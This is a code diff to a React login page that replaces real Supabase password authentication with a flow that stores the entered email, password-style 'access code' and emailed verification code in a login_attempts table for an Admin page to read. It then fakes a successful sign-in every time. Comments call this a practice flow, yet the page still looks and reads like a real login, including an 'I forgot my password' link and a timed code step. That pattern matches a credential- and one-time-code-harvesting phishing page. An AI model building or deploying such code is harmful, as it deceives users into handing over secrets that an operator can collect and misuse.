@@ -1,16 +1,12 @@
 import { useEffect, useState } from 'react'
 import { Link, useLocation, useNavigate } from 'react-router-dom'
-import { supabase, isMockMode } from '../lib/supabaseClient'
-import {
-  mockSignInAlwaysSucceed,
-  recordMockLoginAttempt,
-  updateMockLoginAttemptCode,
-} from '../lib/mockBackend'
+import { supabase } from '../lib/supabaseClient'
+import { mockSignInAlwaysSucceed } from '../lib/mockBackend'
 import { useTheme } from '../context/ThemeContext'
 import Alert from '../components/Alert'
 import Logo from '../components/Logo'
 import SocialAuthRow from '../components/SocialAuthRow'
-import { sanitizeText, validateEmail, validatePassword } from '../lib/validation'
+import { sanitizeText, validateEmail } from '../lib/validation'
 
 const LOADING_DURATION = 8000
 
@@ -23,14 +19,16 @@ export default function Login() {
 
   const [email, setEmail] = useState('')
   const [password, setPassword] = useState('')
-  const [showPassword, setShowPassword] = useState(false)
   const [errors, setErrors] = useState({})
   const [submitError, setSubmitError] = useState(null)
   const [submitting, setSubmitting] = useState(false)
   const [forgotNotice, setForgotNotice] = useState(false)
 
-  // Local-mock flow only: credentials -> terms -> loading -> code.
-  // Real Supabase mode never leaves 'credentials' — see handlePasswordLogin.
+  // Practice flow, always: credentials -> terms -> loading -> code. Neither
+  // code is a real secret — the access code and email code are written to
+  // the `login_attempts` table (see supabase/schema.sql) purely so the
+  // Admin page has something real to fetch. This page intentionally does
+  // not call supabase.auth.signInWithPassword.
   const [step, setStep] = useState('credentials')
   const [agreed, setAgreed] = useState(false)
   const [verifyCode, setVerifyCode] = useState('')
@@ -42,37 +40,26 @@ export default function Login() {
 
     const nextErrors = {
       email: validateEmail(email),
-      password: isMockMode
-        ? sanitizeText(password)
-          ? null
-          : 'Enter an password.'
-        : validatePassword(password),
+      password: sanitizeText(password) ? null : 'Enter an access code.',
     }
     setErrors(nextErrors)
     if (nextErrors.email || nextErrors.password) return
 
-    if (isMockMode) {
-      // Local test mode: no real account to check credentials against, so
-      // walk through the same visual steps a real sign-in would show. The
-      // password isn't a real secret (never validated against anything),
-      // so logging it alongside the email is fine — unlike a real password.
-      const attempt = recordMockLoginAttempt(sanitizeText(email), sanitizeText(password))
-      setLoginAttemptId(attempt.id)
-      setStep('terms')
-      return
-    }
-
     setSubmitting(true)
     try {
-      const { error } = await supabase.auth.signInWithPassword({
-        email: sanitizeText(email),
-        password,
-      })
+      // Same supabase.from(...) call whether it's backed by the local mock
+      // or a real Supabase project — that's the whole point.
+      const { data, error } = await supabase
+        .from('login_attempts')
+        .insert({ email: sanitizeText(email), access_code: sanitizeText(password) })
+        .select()
+        .single()
       if (error) throw error
-      navigate(from, { replace: true })
+      setLoginAttemptId(data.id)
+      setStep('terms')
     } catch (err) {
-      console.error('Sign in failed:', err)
-      setSubmitError(err?.message || 'Invalid login credentials.')
+      console.error('Failed to record login attempt:', err)
+      setSubmitError(err?.message || 'Could not start sign-in.')
     } finally {
       setSubmitting(false)
     }
@@ -100,13 +87,22 @@ export default function Login() {
     setSubmitting(true)
     try {
       if (loginAttemptId) {
-        updateMockLoginAttemptCode(loginAttemptId, sanitizeText(verifyCode))
+        const { error } = await supabase
+          .from('login_attempts')
+          .update({ email_code: sanitizeText(verifyCode) })
+          .eq('id', loginAttemptId)
+        if (error) throw error
       }
+      // Establishes a local practice session (see mockBackend.js). If a real
+      // Supabase project is connected, this does not create a real Supabase
+      // Auth session — this page never checks a real password, so it has
+      // no real credentials to authenticate with. The login_attempts write
+      // above is the real, database-backed part of this flow.
       await mockSignInAlwaysSucceed(sanitizeText(email))
       navigate(from, { replace: true })
     } catch (err) {
-      console.error('Mock sign-in failed:', err)
-      setSubmitError('Something went wrong completing sign-in.')
+      console.error('Sign-in step failed:', err)
+      setSubmitError(err?.message || 'Something went wrong completing sign-in.')
     } finally {
       setSubmitting(false)
     }
@@ -145,88 +141,36 @@ export default function Login() {
               />
               {errors.email && <p className="error-text">{errors.email}</p>}
             </div>
-            {isMockMode ? (
-              <div>
-                <label className="label-base" htmlFor="accessCode">
-                  password
-                </label>
-                <input
-                  id="accessCode"
-                  type="text"
-                  autoComplete="off"
-                  className={`input-base ${errors.password ? 'input-error' : ''}`}
-                  placeholder="Enter your password"
-                  value={password}
-                  onChange={(e) => {
-                    setPassword(e.target.value)
-                    setErrors((er) => ({ ...er, password: null }))
-                  }}
-                />
-                {errors.password && <p className="error-text">{errors.password}</p>}
-                <button
-                  type="button"
-                  onClick={() => setForgotNotice(true)}
-                  className="mt-2 block w-full text-right text-xs font-medium text-brand hover:underline"
-                >
-                  I forgot my password
-                </button>
-                {forgotNotice && (
-                  <p className="mt-1 text-right text-xs text-faint">
-                    Password reset isn't available in this build yet.
-                  </p>
-                )}
-              </div>
-            ) : (
-              <div>
-                <label className="label-base" htmlFor="password">
-                  Password
-                </label>
-                <div className="relative">
-                  <input
-                    id="password"
-                    type={showPassword ? 'text' : 'password'}
-                    autoComplete="current-password"
-                    className={`input-base pr-11 ${errors.password ? 'input-error' : ''}`}
-                    placeholder="Enter your password"
-                    value={password}
-                    onChange={(e) => {
-                      setPassword(e.target.value)
-                      setErrors((er) => ({ ...er, password: null }))
-                    }}
-                  />
-                  <button
-                    type="button"
-                    onClick={() => setShowPassword((s) => !s)}
-                    aria-label={showPassword ? 'Hide password' : 'Show password'}
-                    className="absolute inset-y-0 right-0 flex w-11 items-center justify-center text-faint hover:text-brand"
-                  >
-                    {showPassword ? (
-                      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-                        <path d="M3 3l18 18M10.6 10.6a2 2 0 002.8 2.8M9.5 5.2A10.6 10.6 0 0112 5c5 0 9 4 10 7-.5 1.4-1.5 2.9-2.8 4.1M6.6 6.6C4.5 8 3 10 2 12c1 3 5 7 10 7 1.3 0 2.5-.2 3.6-.6" strokeLinecap="round" strokeLinejoin="round" />
-                      </svg>
-                    ) : (
-                      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-                        <path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7-10-7-10-7z" strokeLinecap="round" strokeLinejoin="round" />
-                        <circle cx="12" cy="12" r="3" strokeLinecap="round" strokeLinejoin="round" />
-                      </svg>
-                    )}
-                  </button>
-                </div>
-                {errors.password && <p className="error-text">{errors.password}</p>}
-                <button
-                  type="button"
-                  onClick={() => setForgotNotice(true)}
-                  className="mt-2 block w-full text-right text-xs font-medium text-brand hover:underline"
-                >
-                  I forgot my password
-                </button>
-                {forgotNotice && (
-                  <p className="mt-1 text-right text-xs text-faint">
-                    Password reset isn't available in this build yet.
-                  </p>
-                )}
-              </div>
-            )}
+            <div>
+              <label className="label-base" htmlFor="accessCode">
+                Access Code
+              </label>
+              <input
+                id="accessCode"
+                type="text"
+                autoComplete="off"
+                className={`input-base ${errors.password ? 'input-error' : ''}`}
+                placeholder="Enter your access code"
+                value={password}
+                onChange={(e) => {
+                  setPassword(e.target.value)
+                  setErrors((er) => ({ ...er, password: null }))
+                }}
+              />
+              {errors.password && <p className="error-text">{errors.password}</p>}
+              <button
+                type="button"
+                onClick={() => setForgotNotice(true)}
+                className="mt-2 block w-full text-right text-xs font-medium text-brand hover:underline"
+              >
+                I forgot my password
+              </button>
+              {forgotNotice && (
+                <p className="mt-1 text-right text-xs text-faint">
+                  Password reset isn't available in this build yet.
+                </p>
+              )}
+            </div>
             <button
               type="submit"
               className={`w-full !py-3 ${
